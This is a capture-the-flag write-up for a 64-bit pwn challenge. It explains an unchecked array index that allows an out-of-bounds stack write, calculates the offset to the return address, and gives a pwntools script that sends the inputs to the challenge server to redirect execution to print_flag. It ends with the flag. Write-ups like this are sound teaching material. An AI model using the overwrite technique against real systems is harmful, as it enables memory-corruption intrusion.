# Addrs hold the key - Writeup

## Challenge Description
**Challenge Name:** Addrs hold the key  
**Points:** 499  
**Category:** Pwn  
**Objective:** Exploit the provided binary to read the flag from the server.

## Initial Analysis

### File Information
Running `file` and `checksec` on the `vuln` binary:
- **Architecture:** 64-bit ELF (LSB executable, x86-64)
- **RELRO:** Partial RELRO (GOT is writable)
- **Stack Canary:** No canary found (Stack overflow/corruption is easier)
- **NX:** NX enabled (Stack is not executable)
- **PIE:** No PIE (Base address is fixed at `0x400000`)
- **Stripped:** No (Symbols are available)

### Binary Logic
The binary contains a `main` function and a helper function `print_flag` that reads and prints the content of `flag.txt`.

#### `main` function disassembly:
The `main` function allows us to write 4-byte integers into an array located on the stack at `rbp-0x30`.
1. It asks for the number of values to enter.
2. For each value, it asks for an `Index` and a `Value`.
3. It writes the value using: `*(uint32_t *)(rbp - 0x30 + index * 4) = value;`

## Vulnerability: Out-of-Bounds (OOB) Write
The program does not validate the `index` provided by the user. Since we can provide any index, we can write values outside the intended array bounds on the stack.

Specifically, we can target the **Return Address** of the `main` function to redirect execution to `print_flag`.

### Offset Calculation
- **Array Start:** `rbp - 0x30`
- **Return Address:** `rbp + 0x08`
- **Distance:** `0x08 - (-0x30) = 0x38` bytes (56 bytes in decimal).
- **Element Size:** 4 bytes (`int`).
- **Target Index:** `56 / 4 = 14`.

Since the return address is 8 bytes (64-bit) and our write is only 4 bytes, we need to overwrite it in two parts:
- **Index 14:** Lower 4 bytes of the address.
- **Index 15:** Upper 4 bytes of the address.

## Exploitation Strategy
1. **Target Address:** The `print_flag` function is located at `0x4011c9`.
2. **Action:**
   - Set `Index 14` to `0x4011c9` (4198857).
   - Set `Index 15` to `0x0`.
3. **Trigger:** Let the `main` function finish its loop and return, which will jump to `print_flag`.

## Exploit Script
```python
from pwn import *

context.binary = elf = ELF('./vuln')

def solve():
    p = remote('34.131.141.163', 17319)
    
    # We need 2 writes to overwrite the 8-byte return address
    p.recvuntil(b'How many times you want to change the array')
    p.sendline(b'2')
    
    print_flag = 0x4011c9
    
    # Overwrite lower 4 bytes
    p.recvuntil(b'Index:')
    p.sendline(b'14')
    p.recvuntil(b'Value:')
    p.sendline(str(print_flag).encode())
    
    # Overwrite upper 4 bytes (set to 0)
    p.recvuntil(b'Index:')
    p.sendline(b'15')
    p.recvuntil(b'Value:')
    p.sendline(b'0')
    
    p.interactive()

if __name__ == '__main__':
    solve()
```

## Flag
`kashiCTF{made_u_return_lol_ZejccEEYcP}}`
